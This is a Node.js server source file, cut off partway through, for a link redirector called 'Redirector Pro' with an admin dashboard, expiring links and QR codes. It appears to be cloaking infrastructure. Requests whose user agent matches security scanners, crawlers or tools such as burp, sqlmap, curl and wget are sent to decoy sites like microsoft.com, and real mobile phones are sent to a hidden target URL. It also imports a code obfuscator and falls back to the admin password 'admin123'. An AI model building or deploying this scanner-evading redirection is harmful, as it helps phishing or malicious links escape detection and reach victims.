const express = require('express');
const helmet = require('helmet');
const fs = require('fs').promises;
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const fetch = require('node-fetch');
const NodeCache = require('node-cache');
const JavaScriptObfuscator = require('javascript-obfuscator');
const compression = require('compression');
const morgan = require('morgan');
const { body, validationResult } = require('express-validator');
const uaParser = require('ua-parser-js');
const QRCode = require('qrcode');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const multer = require('multer');
const dotenv = require('dotenv');

// Load environment variables
dotenv.config();

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: process.env.CORS_ORIGIN ? process.env.CORS_ORIGIN.split(',') : "*",
    methods: ["GET", "POST"],
    credentials: true
  },
  pingTimeout: 60000,
  pingInterval: 25000
});

app.set('trust proxy', 1);
app.use(compression({ level: 6, threshold: 0 }));
app.use(morgan('combined'));
app.use(express.static('public'));

// ─── Session Store Configuration ────────────────────────────────────────────
let sessionStore;
let redisClient;

// Check if Redis is configured (for production)
if (process.env.REDIS_URL || process.env.REDIS_HOST) {
  try {
    const Redis = require('redis');
    const RedisStore = require('connect-redis')(session);
    
    const redisConfig = {
      url: process.env.REDIS_URL || `redis://${process.env.REDIS_HOST}:${process.env.REDIS_PORT || 6379}`,
      password: process.env.REDIS_PASSWORD,
      socket: {
        reconnectStrategy: (retries) => Math.min(retries * 50, 1000)
      }
    };
    
    redisClient = Redis.createClient(redisConfig);
    
    redisClient.on('error', (err) => {
      console.error('❌ Redis error:', err.message);
      console.log('⚠️ Falling back to MemoryStore');
      sessionStore = new session.MemoryStore();
    });
    
    redisClient.on('connect', () => {
      console.log('✅ Connected to Redis for session storage');
      sessionStore = new RedisStore({ client: redisClient });
    });
    
    redisClient.on('ready', () => {
      console.log('✅ Redis client ready');
    });
    
    redisClient.connect().catch(err => {
      console.error('❌ Redis connection failed:', err.message);
      sessionStore = new session.MemoryStore();
    });
    
  } catch (err) {
    console.log('⚠️ Redis modules not installed, using MemoryStore');
    console.log('   Run: npm install redis connect-redis');
    sessionStore = new session.MemoryStore();
  }
} else {
  console.log('⚠️ Using MemoryStore - not suitable for production!');
  console.log('   Set REDIS_URL environment variable for production session storage');
  sessionStore = new session.MemoryStore();
}

// Session setup for admin UI
app.use(session({
  store: sessionStore,
  secret: process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex'),
  resave: false,
  saveUninitialized: false,
  name: 'redirector.sid',
  cookie: { 
    secure: process.env.NODE_ENV === 'production' && process.env.HTTPS_ENABLED === 'true', 
    maxAge: 24 * 60 * 60 * 1000, // 24 hours
    httpOnly: true,
    sameSite: 'lax',
    path: '/'
  },
  rolling: true
}));

// ─── Config ──────────────────────────────────────────────────────────────────
const TARGET_URL   = process.env.TARGET_URL   || 'https://example.com';
const BOT_URLS     = process.env.BOT_URLS ? 
  process.env.BOT_URLS.split(',').map(url => url.trim()) : [
    'https://www.microsoft.com',
    'https://www.apple.com',
    'https://www.google.com',
    'https://en.wikipedia.org/wiki/Main_Page',
    'https://www.bbc.com'
  ];

const LOG_FILE     = 'clicks.log';
const REQUEST_LOG_FILE = 'requests.log';
const SUCCESS_LOG_FILE = 'success.log';
const PORT         = process.env.PORT || 10000;

// Admin credentials
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
const ADMIN_PASSWORD_HASH = process.env.ADMIN_PASSWORD_HASH || 
  bcrypt.hashSync('admin123', 10);

// Parse TTL from environment variable
function parseTTL(ttlValue) {
  const defaultTTL = 1800; // 30 minutes default
  
  if (!ttlValue) return defaultTTL;
  
  const match = String(ttlValue).match(/^(\d+)([smhd])?$/i);
  if (!match) return defaultTTL;
  
  const num = parseInt(match[1]);
  const unit = (match[2] || 'm').toLowerCase();
  
  switch(unit) {
    case 's': return Math.max(60, num); // Minimum 60 seconds
    case 'm': return Math.max(1, num) * 60;
    case 'h': return Math.max(1, num) * 3600;
    case 'd': return Math.max(1, num) * 86400;
    default: return Math.max(60, num * 60);
  }
}

const LINK_TTL_SEC = parseTTL(process.env.LINK_TTL);
const METRICS_API_KEY = process.env.METRICS_API_KEY || crypto.randomBytes(32).toString('hex');
const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
const NODE_ENV = process.env.NODE_ENV || 'production';
const MAX_LINKS = parseInt(process.env.MAX_LINKS) || 1000000;

// Format TTL for display
function formatDuration(seconds) {
  if (seconds < 60) return `${seconds} seconds`;
  if (seconds < 3600) {
    const mins = Math.floor(seconds / 60);
    return `${mins} minute${mins !== 1 ? 's' : ''}`;
  }
  if (seconds < 86400) {
    const hours = Math.floor(seconds / 3600);
    const mins = Math.floor((seconds % 3600) / 60);
    return mins > 0 ? `${hours} hour${hours !== 1 ? 's' : ''} ${mins} min` : `${hours} hour${hours !== 1 ? 's' : ''}`;
  }
  const days = Math.floor(seconds / 86400);
  const hours = Math.floor((seconds % 86400) / 3600);
  return hours > 0 ? `${days} day${days !== 1 ? 's' : ''} ${hours} hour${hours !== 1 ? 's' : ''}` : `${days} day${days !== 1 ? 's' : ''}`;
}

// Cache instances with optimized settings
const geoCache  = new NodeCache({ 
  stdTTL: 86400, 
  checkperiod: 3600, 
  useClones: false,
  deleteOnExpire: true
});

const linkCache = new NodeCache({ 
  stdTTL: LINK_TTL_SEC, 
  checkperiod: Math.min(300, Math.floor(LINK_TTL_SEC / 10)), 
  useClones: false, 
  maxKeys: MAX_LINKS,
  deleteOnExpire: true
});

const linkRequestCache = new NodeCache({ 
  stdTTL: 60, 
  checkperiod: 10, 
  useClones: false,
  deleteOnExpire: true 
});

const failCache = new NodeCache({ 
  stdTTL: 3600, 
  checkperiod: 600, 
  useClones: false,
  deleteOnExpire: true 
});

const deviceCache = new NodeCache({ 
  stdTTL: 300, 
  checkperiod: 60, 
  useClones: false,
  deleteOnExpire: true 
});

const qrCache = new NodeCache({ 
  stdTTL: 3600, 
  checkperiod: 600, 
  useClones: false,
  deleteOnExpire: true 
});

// ─── Stats Tracking ──────────────────────────────────────────────────────────
const stats = {
  totalRequests: 0,
  botBlocks: 0,
  successfulRedirects: 0,
  expiredLinks: 0,
  generatedLinks: 0,
  byCountry: {},
  byBotReason: {},
  byDevice: { mobile: 0, desktop: 0, tablet: 0, bot: 0 },
  realtime: {
    lastMinute: [],
    activeLinks: 0,
    requestsPerSecond: 0,
    startTime: Date.now()
  }
};

// Socket.IO connection handling with authentication
io.use((socket, next) => {
  const token = socket.handshake.auth.token;
  if (token === METRICS_API_KEY) {
    next();
  } else {
    next(new Error('Authentication error'));
  }
}).on('connection', (socket) => {
  console.log('📊 Admin client connected:', socket.id);
  
  // Send initial stats
  socket.emit('stats', stats);
  socket.emit('config', {
    linkTTL: LINK_TTL_SEC,
    linkTTLFormatted: formatDuration(LINK_TTL_SEC),
    targetUrl: TARGET_URL,
    botUrls: BOT_URLS,
    maxLinks: MAX_LINKS,
    uptime: process.uptime()
  });

  socket.on('disconnect', () => {
    console.log('📊 Admin client disconnected:', socket.id);
  });

  // Handle admin commands
  socket.on('command', async (cmd) => {
    try {
      switch(cmd.action) {
        case 'clearCache':
          linkCache.flushAll();
          geoCache.flushAll();
          deviceCache.flushAll();
          qrCache.flushAll();
          socket.emit('notification', { type: 'success', message: 'Cache cleared successfully' });
          break;
          
        case 'getStats':
          socket.emit('stats', stats);
          break;
          
        case 'getConfig':
          socket.emit('config', {
            linkTTL: LINK_TTL_SEC,
            linkTTLFormatted: formatDuration(LINK_TTL_SEC),
            targetUrl: TARGET_URL,
            botUrls: BOT_URLS,
            maxLinks: MAX_LINKS,
            nodeEnv: NODE_ENV
          });
          break;
          
        default:
          socket.emit('notification', { type: 'error', message: 'Unknown command' });
      }
    } catch (err) {
      socket.emit('notification', { type: 'error', message: err.message });
    }
  });
});

// Update realtime stats every second
setInterval(() => {
  stats.realtime.activeLinks = linkCache.keys().length;
  stats.realtime.lastMinute = stats.realtime.lastMinute.slice(-60);
  
  const now = Date.now();
  const lastSecond = stats.realtime.lastMinute.filter(t => now - t.time < 1000);
  stats.realtime.requestsPerSecond = lastSecond.length;
  
  stats.realtime.lastMinute.push({
    time: now,
    requests: stats.totalRequests,
    blocks: stats.botBlocks,
    successes: stats.successfulRedirects
  });
  
  // Broadcast updates to all connected admin clients
  io.emit('stats', stats);
}, 1000);

// Cleanup interval for old stats
setInterval(() => {
  stats.realtime.lastMinute = stats.realtime.lastMinute.slice(-60);
}, 60000);

// ─── Enhanced Device Detection ───────────────────────────────────────────────
function getDeviceInfo(req) {
  const ua = req.headers['user-agent'] || '';
  
  // Check cache
  const cacheKey = crypto.createHash('md5').update(ua.substring(0, 200)).digest('hex');
  const cached = deviceCache.get(cacheKey);
  if (cached) return cached;

  const parser = new uaParser(ua);
  const result = parser.getResult();
  
  const deviceInfo = {
    type: 'desktop',
    brand: result.device.vendor || 'unknown',
    model: result.device.model || 'unknown',
    os: result.os.name || 'unknown',
    osVersion: result.os.version || 'unknown',
    browser: result.browser.name || 'unknown',
    browserVersion: result.browser.version || 'unknown',
    isMobile: false,
    isTablet: false,
    isBot: false,
    score: 0
  };

  // Check for bots first
  const uaLower = ua.toLowerCase();
  const botPatterns = [
    'headless', 'phantom', 'slurp', 'zgrab', 'scanner', 'bot', 'crawler', 
    'spider', 'burp', 'sqlmap', 'curl', 'wget', 'python', 'perl', 'ruby', 
    'go-http-client', 'java', 'okhttp', 'scrapy', 'httpclient', 'axios',
    'node-fetch', 'php', 'libwww', 'wget', 'fetch', 'ahrefs', 'semrush'
  ];
  
  if (botPatterns.some(pattern => uaLower.includes(pattern))) {
    deviceInfo.type = 'bot';
    deviceInfo.isBot = true;
    deviceInfo.score = 100;
    deviceCache.set(cacheKey, deviceInfo);
    stats.byDevice.bot = (stats.byDevice.bot || 0) + 1;
    return deviceInfo;
  }

  // Detect mobile/tablet
  if (result.device.type === 'mobile' || /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
    if (result.device.type === 'tablet' || /Tablet|iPad|PlayBook|Silk|Kindle|(Android(?!.*Mobile))/i.test(ua)) {
      deviceInfo.type = 'tablet';
      deviceInfo.isTablet = true;
    } else {
      deviceInfo.type = 'mobile';
      deviceInfo.isMobile = true;
    }
  }

  // Real device scoring (LOW scores for real phones)
  if (deviceInfo.isMobile) {
    // Real phones get very low scores
    if (deviceInfo.brand !== 'unknown') deviceInfo.score -= 10;
    if (deviceInfo.model !== 'unknown') deviceInfo.score -= 10;
    if (deviceInfo.os !== 'unknown') deviceInfo.score -= 5;
    if (deviceInfo.browser !== 'unknown') deviceInfo.score -= 5;
    
    // Common mobile browsers get extra points
    if (deviceInfo.browser.includes('Safari') || 
        deviceInfo.browser.includes('Chrome') || 
        deviceInfo.browser.includes('Firefox')) {
      deviceInfo.score -= 15;
    }
    
    // Common mobile OS
    if (deviceInfo.os.includes('iOS') || 
        deviceInfo.os.includes('Android')) {
      deviceInfo.score -= 15;
    }
    
    // Known brands
    if (deviceInfo.brand.includes('Apple') || 
        deviceInfo.brand.includes('Samsung') || 
        deviceInfo.brand.includes('Huawei') ||
        deviceInfo.brand.includes('Xiaomi') ||
        deviceInfo.brand.includes('Google') ||
        deviceInfo.brand.includes('OnePlus') ||
        deviceInfo.brand.includes('Oppo') ||
        deviceInfo.brand.includes('Vivo')) {
      deviceInfo.score -= 20;
    }
  }

  deviceCache.set(cacheKey, deviceInfo);
  stats.byDevice[deviceInfo.type] = (stats.byDevice[deviceInfo.type] || 0) + 1;
  
  return deviceInfo;
}

// ─── Middleware ──────────────────────────────────────────────────────────────
app.use((req, res, next) => {
  req.id = crypto.randomBytes(8).toString('hex');
  req.startTime = Date.now();
  req.deviceInfo = getDeviceInfo(req);
  res.locals.nonce = crypto.randomBytes(16).toString('hex');
  res.locals.startTime = Date.now();
  res.locals.deviceInfo = req.deviceInfo;
  res.setHeader('X-Request-ID', req.id);
  res.setHeader('X-Device-Type', req.deviceInfo.type);
  res.setHeader('X-Response-Time', '0');
  res.setHeader('X-Powered-By', 'Redirector-Pro');
  
  // Response time header
  res.on('finish', () => {
    const duration = Date.now() - req.startTime;
    res.setHeader('X-Response-Time', duration + 'ms');
  });
  
  stats.totalRequests++;
  next();
});

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`, 'https://cdn.socket.io', 'https://cdn.jsdelivr.net'],
      styleSrc: ["'self'", "'unsafe-inline'", 'https://cdn.jsdelivr.net'],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'", 'ws:', 'wss:'],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: process.env.NODE_ENV === 'production' ? [] : null
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  noSniff: true,
  xssFilter: true
}));

app.use(express.json({ limit: '50kb' }));
app.use(express.urlencoded({ extended: true, limit: '50kb' }));

// ─── Logging Helper ─────────────────────────────────────────────────────────
async function logRequest(type, req, res, extra = {}) {
  try {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '0.0.0.0';
    const duration = res?.locals?.startTime ? Date.now() - res.locals.startTime : 0;
    
    const logEntry = {
      t: Date.now(),
      id: req.id,
      type,
      ip: ip.substring(0, 15),
      device: req.deviceInfo.type,
      path: req.path,
      method: req.method,
      duration: duration,
      ...extra
    };
    
    // Emit log to admin clients
    io.emit('log', logEntry);
    
    // Write to file asynchronously
    fs.appendFile(REQUEST_LOG_FILE, JSON.stringify(logEntry) + '\n').catch(() => {});
    
    if (process.env.DEBUG === 'true') {
      console.log(`[${type}] ${ip} ${req.method} ${req.path} (${duration}ms)`);
    }
  } catch (err) {
    // Silent fail
  }
}

// ─── Health Endpoints ───────────────────────────────────────────────────────
app.get(['/ping','/health','/healthz','/status'], (req, res) => {
  const healthData = {
    status: 'healthy',
    time: Date.now(),
    uptime: process.uptime(),
    id: req.id,
    memory: process.memoryUsage(),
    stats: {
      totalRequests: stats.totalRequests,
      activeLinks: linkCache.keys().length,
      botBlocks: stats.botBlocks
    }
  };
  res.status(200).json(healthData);
});

// ─── Metrics Endpoint ────────────────────────────────────────────────────────
app.get('/metrics', async (req, res) => {
  const apiKey = req.headers['x-api-key'] || req.query.key;
  if (apiKey !== METRICS_API_KEY) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  const metrics = {
    version: '3.0.0',
    timestamp: Date.now(),
    uptime: process.uptime(),
    links: linkCache.keys().length,
    caches: {
      geo: geoCache.keys().length,
      linkReq: linkRequestCache.keys().length,
      device: deviceCache.keys().length,
      qr: qrCache.keys().length
    },
    memory: {
      rss: process.memoryUsage().rss,
      heapTotal: process.memoryUsage().heapTotal,
      heapUsed: process.memoryUsage().heapUsed,
      external: process.memoryUsage().external
    },
    totals: {
      requests: stats.totalRequests,
      blocks: stats.botBlocks,
      successes: stats.successfulRedirects,
      expired: stats.expiredLinks,
      generated: stats.generatedLinks
    },
    devices: stats.byDevice,
    realtime: stats.realtime,
    config: {
      linkTTL: LINK_TTL_SEC,
      linkTTLFormatted: formatDuration(LINK_TTL_SEC),
      maxLinks: MAX_LINKS,
      nodeEnv: NODE_ENV
    }
  };
  
  res.json(metrics);
});

// ─── Admin UI Routes ─────────────────────────────────────────────────────────
// Login page
app.get('/admin/login', (req, res) => {
  if (req.session.authenticated) {
    return res.redirect('/admin');
  }
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Admin Login - Redirector Pro</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center}
        .login-card{background:white;padding:2rem;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,0.3);width:100%;max-width:400px}
        h1{text-align:center;margin-bottom:2rem;color:#333}
        .form-group{margin-bottom:1rem}
        label{display:block;margin-bottom:0.5rem;color:#666}
        input{width:100%;padding:0.75rem;border:2px solid #e0e0e0;border-radius:8px;font-size:1rem;transition:border-color 0.2s}
        input:focus{outline:none;border-color:#667eea}
        button{width:100%;padding:1rem;background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:white;border:none;border-radius:8px;font-size:1rem;font-weight:600;cursor:pointer;transition:transform 0.2s}
        button:hover{transform:translateY(-2px)}
        .error{background:#fee;color:#c00;padding:0.75rem;border-radius:8px;margin-bottom:1rem;display:none}
        .footer{text-align:center;margin-top:1rem;color:#999;font-size:0.9rem}
      </style>
    </head>
    <body>
      <div class="login-card">
        <h1>🔐 Admin Login</h1>
        <div class="error" id="error"></div>
        <form id="loginForm">
          <div class="form-group">
            <label>Username</label>
            <input type="text" id="username" placeholder="Enter username" required>
          </div>
          <div class="form-group">
            <label>Password</label>
            <input type="password" id="password" placeholder="Enter password" required>
          </div>
          <button type="submit">Login</button>
        </form>
        <div class="footer">Redirector Pro v3.0</div>
      </div>
      <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
          e.preventDefault();
          const res = await fetch('/admin/login', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              username: document.getElementById('username').value,
              password: document.getElementById('password').value
            })
          });
          if (res.ok) {
            window.location.href = '/admin';
          } else {
            document.getElementById('error').style.display = 'block';
            document.getElementById('error').textContent = 'Invalid credentials';
          }
        });
      </script>
    </body>
    </html>
  `);
});

app.post('/admin/login', express.json(), async (req, res) => {
  const { username, password } = req.body;
  
  // Rate limit login attempts
  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || 'unknown';
  const attempts = linkRequestCache.get(`login:${ip}`) || 0;
  
  if (attempts >= 5) {
    return res.status(429).json({ error: 'Too many login attempts. Try again later.' });
  }
  
  linkRequestCache.set(`login:${ip}`, attempts + 1, 300); // 5 minute cooldown
  
  if (username === ADMIN_USERNAME && await bcrypt.compare(password, ADMIN_PASSWORD_HASH)) {
    req.session.authenticated = true;
    req.session.user = username;
    req.session.loginTime = Date.now();
    linkRequestCache.del(`login:${ip}`);
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Admin dashboard
app.get('/admin', (req, res) => {
  if (!req.session.authenticated) {
    return res.redirect('/admin/login');
  }
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Redirector Pro - Admin Dashboard</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
      <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
      <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f5}
        .navbar{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:white;padding:1rem 2rem;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
        .nav-links button{background:rgba(255,255,255,0.2);border:1px solid rgba(255,255,255,0.3);color:white;padding:0.5rem 1rem;border-radius:4px;cursor:pointer;margin-left:0.5rem;transition:all 0.2s}
        .nav-links button:hover{background:rgba(255,255,255,0.3);transform:translateY(-2px)}
        .container{padding:2rem;max-width:1400px;margin:0 auto}
        .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1.5rem;margin-bottom:2rem}
        .stat-card{background:white;padding:1.5rem;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,0.1);transition:transform 0.2s}
        .stat-card:hover{transform:translateY(-5px);box-shadow:0 5px 20px rgba(0,0,0,0.15)}
        .stat-card h3{color:#666;font-size:0.9rem;text-transform:uppercase;letter-spacing:1px;margin-bottom:0.5rem}
        .stat-card .value{font-size:2.5rem;font-weight:bold;color:#333}
        .stat-card .trend{color:#4caf50;font-size:0.9rem;margin-top:0.5rem}
        .chart-container{background:white;padding:1.5rem;border-radius:12px;margin-bottom:2rem;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
        .tabs{display:flex;gap:0.5rem;margin-bottom:1rem;flex-wrap:wrap}
        .tab{background:white;border:none;padding:0.75rem 1.5rem;cursor:pointer;border-radius:8px;font-size:1rem;transition:all 0.2s;box-shadow:0 2px 4px rgba(0,0,0,0.1)}
        .tab:hover{background:#f0f0f0}
        .tab.active{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:white;font-weight:600}
        .tab-content{display:none}
        .tab-content.active{display:block}
        .config-group{margin-bottom:1rem}
        .config-group label{display:block;margin-bottom:0.5rem;color:#666;font-weight:500}
        .config-group input,.config-group textarea{width:100%;padding:0.75rem;border:2px solid #e0e0e0;border-radius:8px;font-family:monospace;transition:border-color 0.2s}
        .config-group input:focus,.config-group textarea:focus{outline:none;border-color:#667eea}
        .config-group textarea{min-height:100px;resize:vertical}
        button{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:white;border:none;padding:0.75rem 1.5rem;border-radius:8px;cursor:pointer;font-weight:600;transition:all 0.2s;margin-right:0.5rem;margin-bottom:0.5rem}
        button:hover{transform:translateY(-2px);box-shadow:0 5px 15px rgba(102,126,234,0.4)}
        button.secondary{background:#6c757d}
        button.secondary:hover{box-shadow:0 5px 15px rgba(108,117,125,0.4)}
        .button-group{display:flex;gap:1rem;flex-wrap:wrap}
        .link-generator{background:white;padding:1.5rem;border-radius:12px;margin-bottom:2rem;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
        .qr-preview{max-width:200px;margin:1rem 0;border:1px solid #e0e0e0;border-radius:8px;padding:0.5rem}
        .notification{position:fixed;top:20px;right:20px;padding:1rem;border-radius:8px;color:white;animation:slideIn 0.3s ease;z-index:1000;max-width:400px}
        .notification.success{background:#4caf50}
        .notification.error{background:#f44336}
        .notification.info{background:#2196f3}
        @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
        .loading{display:inline-block;width:20px;height:20px;border:3px solid #f3f3f3;border-top-color:#667eea;border-radius:50%;animation:spin 1s linear infinite}
        @keyframes spin{to{transform:rotate(360deg)}}
        .log-container{background:#1e1e1e;color:#fff;padding:1rem;border-radius:8px;font-family:monospace;font-size:12px;height:500px;overflow-y:auto;box-shadow:inset 0 2px 10px rgba(0,0,0,0.5)}
        .log-entry{border-bottom:1px solid #333;padding:0.5rem 0;transition:background 0.2s}
        .log-entry:hover{background:#2a2a2a}
        .log-time{color:#888}
        .log-type{display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;margin:0 0.5rem;font-weight:bold;font-size:10px}
        .log-type.success{background:#4caf50;color:white}
        .log-type.block{background:#f44336;color:white}
        .log-type.redirect{background:#2196f3;color:white}
        .json-viewer{background:#f8f9fa;padding:0.5rem;border-radius:4px;font-family:monospace;font-size:11px;margin-top:0.5rem}
        .country-badge{display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;background:#e9ecef;margin:0.2rem;font-size:0.9rem}
        @media (max-width: 768px) {
          .navbar{flex-direction:column;text-align:center}
          .nav-links{margin-top:1rem}
          .stats-grid{grid-template-columns:1fr}
          .button-group{flex-direction:column}
          button{width:100%}
        }
      </style>
    </head>
    <body>
      <div class="navbar">
        <h1>🔗 Redirector Pro Admin</h1>
        <div class="nav-links">
          <button onclick="refreshData()">🔄 Refresh</button>
          <button onclick="logout()">🚪 Logout</button>
        </div>
      </div>
      
      <div class="container">
        <!-- Stats Cards -->
        <div class="stats-grid" id="statsGrid">
          <div class="stat-card">
            <h3>Total Requests</h3>
            <div class="value" id="totalRequests">0</div>
            <div class="trend" id="requestsTrend"></div>
          </div>
          <div class="stat-card">
            <h3>Active Links</h3>
            <div class="value" id="activeLinks">0</div>
          </div>
          <div class="stat-card">
            <h3>Bot Blocks</h3>
            <div class="value" id="botBlocks">0</div>
          </div>
          <div class="stat-card">
            <h3>Success Rate</h3>
            <div class="value" id="successRate">0%</div>
          </div>
          <div class="stat-card">
            <h3>Requests/sec</h3>
            <div class="value" id="requestsPerSec">0</div>
          </div>
          <div class="stat-card">
            <h3>Generated Links</h3>
            <div class="value" id="generatedLinks">0</div>
          </div>
        </div>

        <!-- Tabs -->
        <div class="tabs">
          <button class="tab active" onclick="showTab('overview')">📊 Overview</button>
          <button class="tab" onclick="showTab('generator')">🔗 Generator</button>
          <button class="tab" onclick="showTab('config')">⚙️ Configuration</button>
          <button class="tab" onclick="showTab('logs')">📝 Live Logs</button>
          <button class="tab" onclick="showTab('analytics')">📈 Analytics</button>
        </div>

        <!-- Overview Tab -->
        <div id="overview" class="tab-content active">
          <div class="chart-container">
            <h3>Real-time Traffic (Last 60 seconds)</h3>
            <canvas id="trafficChart"></canvas>
          </div>
          
          <div class="chart-container">
            <h3>Device Distribution</h3>
            <canvas id="deviceChart"></canvas>
          </div>

          <div class="chart-container">
            <h3>Top Countries</h3>
            <div id="countryStats"></div>
          </div>
        </div>

        <!-- Generator Tab -->
        <div id="generator" class="tab-content">
          <div class="link-generator">
            <h3>Generate New Link</h3>
            <div class="config-group">
              <label>Target URL</label>
              <input type="url" id="targetUrl" placeholder="https://example.com" value="${TARGET_URL}">
            </div>
            <div class="config-group">
              <label>Custom TTL (optional, e.g., 1h, 30m, 3600)</label>
              <input type="text" id="customTtl" placeholder="e.g., 1h, 30m, 3600">
            </div>
            <div class="config-group">
              <label>
                <input type="checkbox" id="generateQr" checked> Generate QR Code
              </label>
            </div>
            <div class="config-group">
              <label>
                <input type="checkbox" id="showQrPage"> Show QR page before redirect
              </label>
            </div>
            <div class="button-group">
              <button onclick="generateLink()">Generate Link</button>
              <button class="secondary" onclick="clearForm()">Clear</button>
            </div>
            
            <div id="generationResult" style="margin-top:2rem;display:none">
              <h4>Generated Link</h4>
              <div class="config-group">
                <input type="text" id="generatedUrl" readonly>
                <div style="margin-top:0.5rem">
                  <button onclick="copyToClipboard()">📋 Copy URL</button>
                  <button onclick="downloadQR()" id="downloadQrBtn" style="display:none">📱 Download QR</button>
                </div>
              </div>
              <div id="qrContainer" style="margin-top:1rem;text-align:center"></div>
            </div>
          </div>
        </div>

        <!-- Config Tab -->
        <div id="config" class="tab-content">
          <div class="chart-container">
            <h3>System Configuration</h3>
            <div class="config-group">
              <label>Default Target URL</label>
              <input type="url" id="configTargetUrl" value="${TARGET_URL}">
            </div>
            <div class="config-group">
              <label>Bot Redirect URLs (one per line)</label>
              <textarea id="configBotUrls">${BOT_URLS.join('\n')}</textarea>
            </div>
            <div class="config-group">
              <label>Link TTL (seconds or format: 30m, 24h, 7d)</label>
              <input type="text" id="configLinkTtl" value="${process.env.LINK_TTL || '30m'}">
            </div>
            <div class="config-group">
              <label>Metrics API Key</label>
              <input type="text" id="metricsApiKey" value="${METRICS_API_KEY}" readonly>
            </div>
            <div class="config-group">
              <label>Session Store</label>
              <input type="text" id="sessionStore" value="${sessionStore.constructor.name}" readonly>
            </div>
            <div class="button-group">
              <button onclick="saveConfig()">💾 Save Configuration</button>
              <button class="secondary" onclick="clearCache()">🗑️ Clear Cache</button>
              <button class="secondary" onclick="exportLogs()">📥 Export Logs</button>
            </div>
          </div>
        </div>

        <!-- Logs Tab -->
        <div id="logs" class="tab-content">
          <div class="chart-container">
            <h3>Live Request Logs</h3>
            <div style="margin-bottom:1rem">
              <button onclick="clearLogs()">Clear Logs</button>
              <button onclick="pauseLogs()" id="pauseBtn">Pause</button>
            </div>
            <div class="log-container" id="logContainer">
              <div id="logs"></div>
            </div>
          </div>
        </div>

        <!-- Analytics Tab -->
        <div id="analytics" class="tab-content">
          <div class="chart-container">
            <h3>Bot Block Reasons</h3>
            <canvas id="botChart"></canvas>
          </div>
          <div class="chart-container">
            <h3>Browser Distribution</h3>
            <canvas id="browserChart"></canvas>
          </div>
        </div>
      </div>

      <div id="notification" class="notification" style="display:none"></div>

      <script>
        const socket = io({
          auth: { token: '${METRICS_API_KEY}' },
          transports: ['websocket', 'polling']
        });
        
        let trafficChart, deviceChart, botChart, browserChart;
        let logsPaused = false;
        let logBuffer = [];
        
        socket.on('stats', (data) => {
          updateStats(data);
          updateCharts(data);
        });
        
        socket.on('notification', (notification) => {
          showNotification(notification.message, notification.type);
        });
        
        socket.on('log', (log) => {
          if (!logsPaused) {
            addLogEntry(log);
          } else {
            logBuffer.push(log);
          }
        });
        
        socket.on('connect', () => {
          showNotification('Connected to real-time server', 'success');
        });
        
        socket.on('disconnect', () => {
          showNotification('Disconnected from real-time server', 'error');
        });
        
        function updateStats(data) {
          document.getElementById('totalRequests').textContent = data.totalRequests.toLocaleString();
          document.getElementById('activeLinks').textContent = data.realtime.activeLinks;
          document.getElementById('botBlocks').textContent = data.botBlocks.toLocaleString();
          document.getElementById('generatedLinks').textContent = data.generatedLinks.toLocaleString();
          document.getElementById('requestsPerSec').textContent = data.realtime.requestsPerSecond;
          
          const successRate = data.totalRequests > 0 
            ? Math.round((data.successfulRedirects / data.totalRequests) * 100) 
            : 0;
          document.getElementById('successRate').textContent = successRate + '%';
          
          if (data.realtime.lastMinute.length > 1) {
            const prev = data.realtime.lastMinute[data.realtime.lastMinute.length - 2] || {requests:0};
            const current = data.realtime.lastMinute[data.realtime.lastMinute.length - 1];
            const trend = prev.requests ? ((current.requests - prev.requests) / prev.requests * 100).toFixed(1) : 0;
            document.getElementById('requestsTrend').textContent = (trend > 0 ? '+' : '') + trend + '% vs last minute';
          }

          // Update country stats
          const countryHtml = Object.entries(data.byCountry)
            .sort((a,b) => b[1] - a[1])
            .slice(0, 10)
